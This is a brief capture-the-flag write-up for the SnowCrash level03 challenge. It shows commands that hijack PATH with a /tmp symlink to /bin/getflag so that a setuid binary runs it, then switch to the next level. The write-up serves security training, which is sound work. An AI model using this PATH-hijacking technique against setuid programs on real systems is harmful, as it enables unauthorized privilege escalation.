# level03

Symbolic links are rather tricky to do securely, especially when `setuid` and friends are involved
```bash
level03@SnowCrash:~ $ ln -s /bin/getflag /tmp/echo
level03@SnowCrash:~ $ env PATH="/tmp:$PATH" ./level03
#OUTPUT
level03@SnowCrash:~ $ rm -f /tmp/echo
level03@SnowCrash:~ $ su level04
#OUTPUT
level04@SnowCrash:~ $
```
